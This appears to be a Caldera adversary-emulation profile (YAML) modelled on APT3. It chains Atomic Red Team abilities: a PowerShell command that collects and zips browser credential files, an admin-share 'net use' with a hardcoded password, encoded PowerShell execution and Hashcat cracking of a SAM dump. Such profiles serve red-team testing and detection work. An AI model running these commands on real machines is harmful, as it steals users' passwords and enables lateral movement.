adversary_id: custom_adversary_profile__APT_3__APT3_Phase2_Pattern_2__2023-10-19-22_36_02
name: Custom Adversary Profile
description: [['stockpile__privilege_escalation', 'atomic__privilege_escalation'], ['stockpile__credential-access', 'atomic__credential-access'], ['stockpile__lateral-movement', 'atomic__lateral-movement'], ['stockpile__execution', 'atomic__execution']]
atomic_ordering:
- 56c2f2d8b48bcb1c999d4e8929bd8d9b # ('56c2f2d8b48bcb1c999d4e8929bd8d9b', 'None', 'validate_me') ; {'description': 'This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,\nsimulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). \n', 'tactic': 'credential-access', 'technique': {'attack_id': 'T1555.003', 'name': 'Credentials from Password Stores: Credentials from Web Browsers'}, 'platforms': {'windows': {'psh': {'cleanup': 'Remove-Item -Path "$env:temp\\T1555.003.zip" -force -erroraction silentlycontinue   ; Remove-Item -Path "$env:temp\\T1555.003\\" -force -recurse -erroraction silentlycontinue', 'command': '$exfil_folder = "$env:temp\\T1555.003"; if (test-path "$exfil_folder") {} else {new-item -path "$env:temp" -Name "T1555.003" -ItemType "directory" -force}; $FirefoxCredsLocation = get-childitem -path "$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\"; if (test-path "$FirefoxCredsLocation\\key4.db") {copy-item "$FirefoxCredsLocation\\key4.db" -destination "$exfil_folder\\T1555.003Firefox_key4.db"} else {}; if (test-path "$FirefoxCredsLocation\\logins.json") {copy-item "$FirefoxCredsLocation\\logins.json" -destination "$exfil_folder\\T1555.003Firefox_logins.json"} else {}; if (test-path "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data") {copy-item "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data" -destination "$exfil_folder\\T1555.003Chrome_Login Data"} else {}; if (test-path "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account") {copy-item "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account" -destination "$exfil_folder\\T1555.003Chrome_Login Data For Account"} else {}; if (test-path "$env:appdata\\Opera Software\\Opera Stable\\Login Data") {copy-item "$env:appdata\\Opera Software\\Opera Stable\\Login Data" -destination "$exfil_folder\\T1555.003Opera_Login Data"} else {}; if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {copy-item "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data" -destination "$exfil_folder\\T1555.003Edge_Login Data"} else {} ; compress-archive -path "$exfil_folder" -destinationpath "$exfil_folder.zip" -force', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['56c2f2d8b48bcb1c999d4e8929bd8d9b', 'None', 'validate_me'], 'plugin': 'atomic'}
- fe8f012ae5cdde2d5e3bba7b8ea95d93 # ('fe8f012ae5cdde2d5e3bba7b8ea95d93', 'None', 'None') ; {'description': 'Connecting To Remote Shares\n', 'tactic': 'lateral-movement', 'technique': {'attack_id': 'T1021.002', 'name': 'Remote Services: SMB/Windows Admin Shares'}, 'platforms': {'windows': {'cmd': {'cleanup': '', 'command': 'cmd.exe /c "net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator"', 'payloads': []}}}, 'id__dependence__fact': ['fe8f012ae5cdde2d5e3bba7b8ea95d93', 'None', 'None'], 'plugin': 'atomic'}
- 9cbe6aa572eed558bf7825df0726c1cb # ('9cbe6aa572eed558bf7825df0726c1cb', 'None', 'validate_me') ; {'description': 'Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied', 'tactic': 'execution', 'technique': {'attack_id': 'T1059.001', 'name': 'Command and Scripting Interpreter: PowerShell'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['9cbe6aa572eed558bf7825df0726c1cb', 'None', 'validate_me'], 'plugin': 'atomic'}
- 70850854e26426b18a74438dc5d7fbfc # ('70850854e26426b18a74438dc5d7fbfc', 'None', 'None') ; {'description': 'Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against', 'tactic': 'credential-access', 'technique': {'attack_id': 'T1110.002', 'name': 'Brute Force: Password Cracking'}, 'platforms': {'windows': {'cmd': {'cleanup': 'del %temp%\\hashcat6.7z >nul 2>&1 && del %temp%\\7z1900.exe >nul 2>&1 && del %temp%\\7z /Q /S >nul 2>&1 && del %temp%\\hashcat-unzip /Q /S >nul 2>&1', 'command': 'cd %temp%\\hashcat6\\hashcat-6.1.1\\hashcat.exe\\.. && %temp%\\hashcat6\\hashcat-6.1.1\\hashcat.exe -a 0 -m 1000 -r .\\rules\\Incisive-leetspeak.rule c5068b_sam.txt cab59f_password.lst', 'payloads': ['c5068b_sam.txt', 'cab59f_password.lst']}}}, 'id__dependence__fact': ['70850854e26426b18a74438dc5d7fbfc', 'None', 'None'], 'plugin': 'atomic'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []